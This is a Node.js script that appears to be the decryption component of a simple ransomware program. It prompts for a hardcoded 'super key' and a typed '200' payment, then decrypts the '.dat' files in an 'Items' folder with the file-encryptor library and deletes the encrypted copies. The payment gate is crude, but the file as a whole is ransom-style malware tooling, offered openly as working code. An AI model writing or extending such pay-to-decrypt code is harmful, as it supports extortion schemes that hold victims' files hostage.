var encryptor = require('file-encryptor');
var fs = require('fs');
var readline = require('readline');
var path = require('path');

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter the super key: ', function(key) {
  if (key === 'sernande') {
    rl.question('Please pay 200 to proceed: ', function(payment) {
      if (payment === '200') {
        decryptFiles(key);
      } else {
        console.log('Invalid payment. Decryption cannot proceed.');
        rl.close();
      }
    });
  } else {
    console.log('Invalid key. Decryption cannot proceed.');
    rl.close();
  }
});

function decryptFiles(key) {
  var folderPath = 'Items';
  var encryptedFilesCount = 0;
  var decryptedFilesCount = 0;

  // Read all files in the folder
  fs.readdir(folderPath, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      rl.close();
    } else {
      files.forEach(function(file) {
        if (file.endsWith('.dat')) {
          encryptedFilesCount++;
          var filePath = path.join(folderPath, file);
          var originalFileName = file.replace('_encrypted.dat', '');
          var decryptedFilePath = path.join(folderPath, originalFileName);
          encryptor.decryptFile(filePath, decryptedFilePath, key, function(err) {
            if (err) {
              console.error('Decryption failed for file:', filePath, err);
            } else {
              decryptedFilesCount++;
              console.log('Decryption complete for file:', filePath);
              if (decryptedFilesCount === encryptedFilesCount) {
                // All files have been decrypted, delete encrypted files
                deleteEncryptedFiles(folderPath);
              }
            }
          });
        }
      });
    }
  });
}

function deleteEncryptedFiles(folderPath) {
  fs.readdir(folderPath, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      rl.close();
    } else {
      files.forEach(function(file) {
        if (file.endsWith('_encrypted.dat')) {
          var filePath = path.join(folderPath, file);
          fs.unlink(filePath, function(err) {
            if (err) {
              console.error('Error deleting encrypted file:', filePath, err);
            } else {
              console.log('Encrypted file deleted:', filePath);
            }
          });
        }
      });
      rl.close();
    }
  });
}
